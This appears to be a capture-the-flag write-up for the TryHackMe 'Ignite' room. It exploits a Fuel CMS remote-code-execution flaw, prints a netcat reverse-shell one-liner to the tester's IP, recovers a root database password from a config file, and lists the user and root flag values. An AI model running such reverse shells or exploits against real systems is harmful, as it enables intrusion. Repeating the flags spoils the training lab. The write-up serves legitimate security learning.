# [Ignite](https://tryhackme.com/room/ignite)

`Machine's IP - 10.10.51.11`

# Reconnaissance and Discovery
So, the first thing was to start out with a simple nmap scan and outputting the results to a log file.

`nmap -sS -sC -sV 10.10.51.11 -Pn > nmap-ignite.log`

# Analyzing Information and Risks
The important thing that caught my eye was that only port 80 was accepting connections, so I decided to check that out. The first thing to point out was that it was the default page for a CMS (Content Management System) for a tool calld Fuel.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-18 19:33 Central Standard Time (Mexico)
Nmap scan report for 10.10.51.11
Host is up (0.25s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.39 seconds
```

With no current lead, I searched `fuel cms 1.4 exploit db` and came up with a Remote Code Execution vulnerability that allows [PHP Code Evaluation that can lead to Pre-Auth RCE](https://www.cvedetails.com/cve/CVE-2018-16763/), like I noticied. [ExploitDB code](https://www.exploit-db.com/exploits/47138). Downloading the script, I changed the following:

* url = "http://machine-ip/"
* URL = url+"/fuel/pa....
* r = requests.get(URL)

Upon doing that, I ran the script using `Python 2` and checked my initial privileges.

```
> python 47138.py
cmd:whoami
systemwww-data

<div style="bo" ..
```

With the response, I noticed that we could probably get a better foothold of the box with `Netcat`. So I started a listener: 

```
> nc -lvnp port
listening on [any] 4445 ...
```

Then I went to [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and selected the command for different versions of netcat, just in case. I ran the command in the cmd prompt of the python file from earlier.

```
cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.20.112 4445 >/tmp/f
```

Upon running the command, the netcat listener prompted with an incoming connection.

```
connect to [10.6.20.112] from (UNKNOWN) [10.10.51.11] 53996
/bin/sh: 0: can't access tty; job control turned off
$
```

With having an initial shell, I thought of elevating it to a normal bash shell using Python from the [NETSEC](https://netsec.ws/?p=337) list for spawning shell's. 

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

It gave me the following output:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ whoami
whoami
www-data
```

Finally, we can possibly start with something like [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) but since we don't even have a user password or account than we probably can't even run scripts. Also, I decided that we are in an application directory, giving us the possibility of an user account credentials in a config folder or file. So I moved through  the directories and eventually found the `user.txt`:

```
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

Also, in the directory `/var/www/html/fuel/application/config` I came upon a `database.php` so I printed the contents of the file which gave me the following interesting information:

```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```

With this, I changed my account `sudo -` and specified the password. Then, I went to the root directory which gave me the final `root.txt`

```
root@ubuntu:~# ls               
ls                              
root.txt                        
root@ubuntu:~# cat root.txt     
cat root.txt                    
b9bbcb33e11b80be759c4e844862482d
```

## License
[MIT](https://choosealicense.com/licenses/mit/)